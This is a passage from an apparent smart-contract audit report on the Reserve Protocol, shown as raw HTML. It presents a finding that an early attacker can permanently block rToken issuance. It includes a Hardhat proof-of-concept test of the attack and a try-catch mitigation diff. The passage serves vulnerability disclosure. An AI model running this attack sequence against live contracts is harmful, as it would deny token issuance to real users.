href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/54#issuecomment-1435260233\">HollaDieWaldfee (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Agreed</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/54#issuecomment-1435343609\">tbrent (Reserve) confirmed</a></strong></p>\n<hr>\n<h2 id=\"early-attacker-can-dos-rtoken-issuance\" style=\"position:relative;\"><a href=\"#early-attacker-can-dos-rtoken-issuance\" aria-label=\"early attacker can dos rtoken issuance permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/13\">Early attacker can DOS rToken issuance</a></h2>\n<p><em>Submitted by HollaDieWaldfee, also found by 0xA5DF (<a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/70\">here</a> and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/55\">here</a>)</em></p>\n<p>Note: related to mitigation for <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/384\">M-05</a></p>\n<h3 id=\"lines-of-code-2\" style=\"position:relative;\"><a href=\"#lines-of-code-2\" aria-label=\"lines of code 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/RToken.sol#L308-L312\">https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/RToken.sol#L308-L312</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/RToken.sol#L132\">https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/RToken.sol#L132</a></p>\n<h3 id=\"impact-7\" style=\"position:relative;\"><a href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>An early attacker can DOS the <code>issue</code> functionality in the <code>RToken</code> contract.  </p>\n<p>No issuances can be made. And the DOS cannot be recovered from. It is permanent.  </p>\n<h3 id=\"proof-of-concept-26\" style=\"position:relative;\"><a href=\"#proof-of-concept-26\" aria-label=\"proof of concept 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>You can add the following test to the <code>Furnace.test.ts</code> file and execute it with <code>yarn hardhat test --grep 'M-05 Mitigation Error: DOS issue'</code>.  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"125\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;M-05 Mitigation Error&#39;</span><span class=\"mtk1\">, () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">beforeEach</span><span class=\"mtk1\">(</span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Approvals for issuance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token0</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialBal</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialBal</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialBal</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token3</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialBal</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token0</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialBal</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialBal</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialBal</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token3</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialBal</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Issue tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">: </span><span class=\"mtk10\">BigNumber</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bn</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;100e18&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// await rToken.connect(addr1).issue(issueAmount)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// await rToken.connect(addr2).issue(issueAmount)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;M-05 Mitigation Error: DOS issue&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">/* attack vector actually so bad that attacker can block issuance a loooong time?</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Total supply&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">: </span><span class=\"mtk10\">BigNumber</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bn</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;1e17&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">issue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Total supply&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">transferAmount</span><span class=\"mtk1\">: </span><span class=\"mtk10\">BigNumber</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bn</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;1e16&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">furnace</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">transferAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">advanceTime</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3600</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">furnace</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">melt</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">advanceTime</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3600</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;rToken balance of furnace&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">furnace</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">/* rToken can not be issued</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">issue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;rToken supply too low to melt&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;rToken balance of furnace&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">furnace</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">/* rToken can not be issued even after time passes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">advanceTime</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3600</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">issue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;rToken supply too low to melt&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">/* rToken.melt cannot be called directly either</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">melt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">transferAmount</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;rToken supply too low to melt&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  })</span></span></span></code></pre>\n<p>The attack performs the following steps:  </p>\n<ol>\n<li>Issue <code>1e17</code> rToken</li>\n<li>Transfer <code>1e16</code> rToken to the furnace</li>\n<li>Wait 12 seconds and call <code>Furnace.melt</code> such that the furnace takes notice of the transferred rToken and can pay them out later</li>\n<li>Wait at least 12 seconds such that the furnace would actually call <code>RToken.melt</code></li>\n<li>Now <code>RToken.issue</code> and <code>RToken.melt</code> are permanently DOSed</li>\n</ol>\n<h3 id=\"tools-used-14\" style=\"position:relative;\"><a href=\"#tools-used-14\" aria-label=\"tools used 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use a try-catch block for <code>furnace.melt</code> in the <code>RToken.issueTo</code> function.  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"126\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/p1/RToken.sol b/contracts/p1/RToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 616b1532..fc584688 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/p1/RToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/p1/RToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -129,7 +129,7 @@ contract RTokenP1 is ComponentP1, ERC20PermitUpgradeable, IRToken {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Ensure SOUND basket</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(basketHandler.status() == CollateralStatus.SOUND, &quot;basket unsound&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        furnace.melt();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        try main.furnace().melt() {} catch {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 supply = totalSupply();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Revert if issuance exceeds either supply throttle</span></span></span></code></pre>\n<p>The only instance when <code>furnace.melt</code> reverts is when the <code>totalSupply</code> is too low. But then it is ok to catch the exception and just continue with the issuance and potentially lose rToken appreciation.  </p>\n<p>Potentially losing some rToken appreciation is definitely better than having this attack vector.  </p>\n<p>The <code>RToken.redeemTo</code> function already has the call to the <code>furnance.melt</code> function wrapped in a try-catch block. So redemption cannot be DOSed.  </p>\n<p><strong><a href=\"\">tbrent (Reserve) confirmed</a></strong></p>\n<hr>\n<h2 id=\"assetregistry-cannot-disable-a-bad-asset\" style=\"position:relative;\"><a href=\"#assetregistry-cannot-disable-a-bad-asset\" aria-label=\"assetregistry cannot disable a bad asset permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73\">AssetRegistry cannot disable a bad asset</a></h2>\n<p><em>Submitted by AkshaySrivastav</em></p>\n<h3 